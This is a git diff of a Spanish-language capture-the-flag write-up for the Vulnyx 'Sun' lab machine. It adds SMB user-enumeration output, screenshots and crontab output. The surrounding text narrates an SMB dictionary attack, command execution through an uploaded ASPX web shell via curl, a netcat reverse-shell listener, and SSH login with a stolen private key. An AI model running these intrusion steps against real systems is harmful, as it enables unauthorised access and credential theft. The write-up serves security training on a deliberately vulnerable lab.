@@ -144,8 +144,20 @@ $ enum4linux -P 10.0.2.5
 ```
 [Enum password policy](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/enumeration/passwordPolicy)  
 ```console
-$ enum4linux -U 10.0.2.5
+$ enum4linux -R 10.0.2.5
 ```
+```console
+S-1-22-1-1000 Unix User\punt4n0 (Local User)
+
+[+] Enumerating users using SID S-1-5-21-3376172362-2708036654-1072164461 and logon username '', password ''
+
+S-1-5-21-3376172362-2708036654-1072164461-501 SUN\nobody (Local User)
+S-1-5-21-3376172362-2708036654-1072164461-513 SUN\None (Domain Group)
+S-1-5-21-3376172362-2708036654-1072164461-1000 SUN\punt4n0 (Local User)
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+```
+[enum4linux enum users](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/enumeration/enum4linux_enum)
 ### Weaponization ###
 Observamos un usuario llamado "punt4n0", sabiendo esto y que la política de complejidad de contraseña es muy débil podemos intentar un ataque de diccionario por SMB. Al no haber podido realizar esto con Hydra (debido a que no soporta SMBv1), nos creamos un pequeño script en bash para realizar este ataque: [Script bash dictionary attack](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/scripts/dictionaryAtt_smb.sh)
 El script nos devuelve una contraseña: "sunday". En este caso hemos creado un script muy sencillo de bash que nos ha funcionado en poco tiempo, en caso de que esto se fuese de tiempo, tendríamos que agilizar la ejecución utilizando varios hilos o procesos.  
@@ -202,6 +214,7 @@ Ejecutamos un comando como whoami para ver la respuesta del servidor:
 ```console
 $ curl http://10.0.2.5:8080/last_reverse_shell.aspx?cmd=whoami
 ```
+![image](https://github.com/AlexGis99/Writeups/assets/82893511/c7e4f8f6-b171-4fe1-acda-bcabf0f1ddc5)
 Tenemos respuesta del servicio por lo que hemos conseguido vulnerarlo a través de un RCE. Para un tratamiento más cómodo, nos enviamos una reverse shell a un puerto que dejaremos en escucha (443 por ejemplo):
 ```console
 $ nc -nlvp 443
@@ -225,6 +238,7 @@ Debido a que no tenemos un acceso "limpio" a la máquina, debemos comprometer la
 ```console
 $ ssh -i id_rsa punt4n0@10.0.2.5
 ```
+![image](https://github.com/AlexGis99/Writeups/assets/82893511/d158d46a-2362-4ec9-9a2f-f73b1bd9779a)
 Nos pide un passphrase, que si recordamos, podría ser la contraseña que obtuvimos del archivo de "remember_password", por lo que la introducimos y hemos obtenido acceso por ssh. Ahora podemos acceder cuándo queramos con un acceso más "limpio" que una reverse shell.
 ### Privilege escalation ###
 Empezamos esta fase identificando los permisos que tenemos sobre sudo, pero vemos que ni siquiera lo tiene.
@@ -232,6 +246,7 @@ Identificamos a los grupos a los que está integrado nuestro usuario:
 ```console
 $ id
 ```
+
 Analizamos los ficheros con permisos SUID/SGUID en la máquina (permisos que permiten ejecutar el fichero como root).
 ```console
 $ find / -perm /6000
@@ -240,6 +255,32 @@ No encontramos ninguno singular que nos permita vulnerar la máquina. De todas f
 Pasamos a identificar aquellos procesos cron que se puedan estar utilizando:
 ```console
 $ crontab -l
+```
+```console
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+@reboot /usr/bin/fastcgi-mono-server4 /applications=/:/var/www/aspnet /socket=tcp:127.0.0.1:9000
 ```
 Vemos en [crontab](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/contents/crontab) que existe un proceso que se ejecuta cada vez que se reinicia la máquina. Por mucho que indaguemos dentro de este proceso, no parece haber manera de vulnerarlo.
 Pasamos a ver si hay procesos en ejecución que nos permita determinar una posible ejecución a la que vulnerar, pero no encontramos gran cosa (aparentemente).
